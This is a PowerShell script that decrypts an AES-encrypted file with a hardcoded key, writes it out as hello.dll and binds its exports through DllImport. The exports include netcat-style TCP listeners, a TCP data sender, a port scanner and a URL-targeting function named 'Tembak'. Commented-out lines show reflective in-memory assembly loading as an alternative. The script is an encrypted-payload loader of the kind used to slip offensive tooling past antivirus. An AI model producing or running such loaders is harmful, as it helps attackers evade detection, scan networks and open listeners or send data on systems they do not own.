$hello = "C:\Users\fahri1\Documents\DBS - BIFAST\hello.dll"
if (Test-Path $hello) {
        Remove-Item $hello
}

function HexStringToBytes($hex) {
        $hex = $hex -replace '\s','';
        $bytes = New-Object byte[] ($hex.Length / 2);
        for ($i=0; $i -lt $hex.Length; $i+=2) {
                $bytes[$i/2] = [Convert]::ToByte($hex.Substring($i,2),16)
        }
        return $bytes
}

$key = HexStringToBytes "2814a9ddc9529f174206d5c030229e610cdac08da698003ab0a8f5fcad93a095"
$iv = HexStringToBytes "5030511e51bbf22fb651936cbeeed884"
$CipherText = [IO.File]::ReadAllBytes("C:\Users\fahri1\Documents\DBS - BIFAST\a.txt")
$AES = [System.Security.Cryptography.Aes]::Create()
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$Decryptor = $AES.CreateDecryptor()
$PlainBytes = $Decryptor.TransformFinalBlock($CipherText, 0, $CipherText.Length)
[IO.File]::WriteAllBytes($hello, $PlainBytes)

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
namespace abc
{
        public class abcabc
        {
                const CharSet cs = CharSet.Ansi;
                [DllImport("C:\\Users\\fahri1\\Documents\\DBS - BIFAST\\hello.dll", CharSet = cs, EntryPoint = "HelloWorld")]
                public static extern IntPtr HelloWorld();

                [DllImport("C:\\Users\\fahri1\\Documents\\DBS - BIFAST\\hello.dll", CharSet = cs, EntryPoint = "ShowMessage")]
                public static extern void ShowMessage(string title, string message);

                [DllImport("C:\\Users\\fahri1\\Documents\\DBS - BIFAST\\hello.dll", CharSet = cs, EntryPoint = "Tembak")]
                public static extern void Tembak(string url);

                [DllImport("C:\\Users\\fahri1\\Documents\\DBS - BIFAST\\hello.dll", EntryPoint="NetcatStartTCPListener", CharSet=cs, CallingConvention=CallingConvention.Cdecl)]
                public static extern int NetcatStartTCPListener(string host, int port, int verbose);

                [DllImport("C:\\Users\\fahri1\\Documents\\DBS - BIFAST\\hello.dll", EntryPoint="NetcatStartOneShotTCPListener", CharSet=cs, CallingConvention=CallingConvention.Cdecl)]
                public static extern int NetcatStartOneShotTCPListener(string host, int port, int verbose);

                [DllImport("C:\\Users\\fahri1\\Documents\\DBS - BIFAST\\hello.dll", EntryPoint="NetcatStopTCPListener", CharSet=cs, CallingConvention=CallingConvention.Cdecl)]
                public static extern int NetcatStopTCPListener(int handle);

                [DllImport("C:\\Users\\fahri1\\Documents\\DBS - BIFAST\\hello.dll", EntryPoint="NetcatSendTCP", CharSet=cs, CallingConvention=CallingConvention.Cdecl)]
                public static extern int NetcatSendTCP(string host, int port, string data, int timeoutMs, int verbose);

                [DllImport("C:\\Users\\fahri1\\Documents\\DBS - BIFAST\\hello.dll", EntryPoint="PortScan", CharSet=cs, CallingConvention=CallingConvention.Cdecl)]
                public static extern int PortScan(string host, int start, int end, int timeoutMs, int verbose, string logPath);

                [DllImport("C:\\Users\\fahri1\\Documents\\DBS - BIFAST\\hello.dll", EntryPoint="StartTCPListener", CharSet=cs, CallingConvention=CallingConvention.Cdecl)]
                 public static extern int StartTCPListener(string host, int port, int verbose);
        }
}
"@
# $assembly = [System.Reflection.Assembly]::Load($PlainBytes)
# $entry = $assembly.EntryPoint
# $instance = [Activator]::CreateInstance($entry.DeclaringType)
# $entry.Invoke($instance, @(, [string[]]@('-h')))
